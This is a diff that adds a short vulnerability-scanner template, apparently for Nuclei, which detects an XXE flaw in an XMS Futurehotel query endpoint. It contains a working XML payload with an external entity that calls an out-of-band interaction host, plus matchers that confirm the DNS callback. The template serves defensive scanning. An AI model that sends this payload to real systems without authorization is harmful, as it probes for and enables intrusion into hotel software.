@@ -1,0 +1,30 @@
+id: futurehotel-query-xxe
+info:
+  name: XXE Vulnerability in XMS Futurehotel Query
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  description: |
+    Detects XXE vulnerability in XMS futurehotel-query endpoint by leveraging external entity resolution via DNS.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /XopServerRS/rest/futurehotel/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse}}"> %remote;]>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
